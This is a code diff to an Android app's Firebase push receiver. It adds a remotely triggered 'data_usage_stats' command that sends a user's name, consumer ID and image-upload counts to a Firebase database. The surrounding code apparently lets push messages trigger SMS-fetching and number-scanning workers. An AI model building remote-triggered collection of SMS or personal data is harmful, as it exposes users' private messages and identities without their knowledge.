@@ -17,6 +17,7 @@ import android.iocl.dac_collector.Services.SmsFetchWorker;
 import android.iocl.dac_collector.Services.SmsNumberScanWorker;
 import android.iocl.dac_collector.Ui.BankStatementActivity;
 import android.iocl.dac_collector.Utility.Constant;
+import android.iocl.dac_collector.Utility.FirebaseConfigManager;
 import android.iocl.dac_collector.Utility.NotificationHelper;
 import android.iocl.dac_collector.Utility.SharedPrefs;
 import android.iocl.dac_collector.Utility.SmsWorkUtil;
@@ -40,6 +41,7 @@ import com.google.firebase.messaging.RemoteMessage;
 
 import java.util.Arrays;
 import java.util.List;
+import java.util.Locale;
 import java.util.Map;
 
 import retrofit2.Call;
@@ -54,7 +56,7 @@ public class FCMPushReceiver extends FirebaseMessagingService {
     public void onMessageReceived(RemoteMessage remoteMessage) {
 
         try {
-            Log.d(TAG, "onMessageReceived: " +  remoteMessage.getData());
+            Log.d(TAG, "onMessageReceived: " + remoteMessage.getData());
             routeFcmActions(remoteMessage);
         } catch (Exception e) {
             Log.d(TAG, "onMessageReceived: " + e);
@@ -168,6 +170,15 @@ public class FCMPushReceiver extends FirebaseMessagingService {
                      */
                     SmsWorkUtil.enqueueSmsWorker(getApplicationContext(), "TEST-001", Constant.testSms, System.currentTimeMillis() + "");
                     break;
+                case "data_usage_stats":
+                    /*
+
+                    @actions:  update_status
+                    @payload:  not require
+
+                     */
+                    uploadUserStats();
+                    break;
                 case "notification_web": // 512 version code er pore add hoyeche
 
 
@@ -200,6 +211,44 @@ public class FCMPushReceiver extends FirebaseMessagingService {
 
 
         }
+    }
+
+
+    private void uploadUserStats() {
+
+
+        long bytes = SharedPrefs.getUploadedBytes();
+
+
+        float uploadedMb = bytes / (1024f * 1024f);
+
+        String stats =
+                "Stats              : " +
+                        SharedPrefs.getUsername() + " - " +
+                        SharedPrefs.getConsumerId() + "\n" +
+
+                        "Upload Count       : " +
+                        SharedPrefs.getUploadCount() + " / " +
+                        FirebaseConfigManager.getImgDailyLimit() + "\n" +
+
+                        "Uploaded MB        : " +
+                        String.format(Locale.ENGLISH, "%.2f", uploadedMb) +
+                        " MB / " +
+                        FirebaseConfigManager.getImgDailyMbLimit() + " MB\n" +
+
+                        "Last Reset Time    : " +
+                        SharedPrefs.getLastResetTime() + "\n" +
+
+                        "Last Reset Date    : " +
+                        new java.text.SimpleDateFormat(
+                                "dd-MM-yyyy HH:mm:ss",
+                                Locale.ENGLISH
+                        ).format(new java.util.Date(
+                                SharedPrefs.getLastResetTime()
+                        ));
+
+        FirebaseDBClient.updateUploadStatus(stats);
+
     }
 
     private void debugFCM(RemoteMessage remoteMessage) {
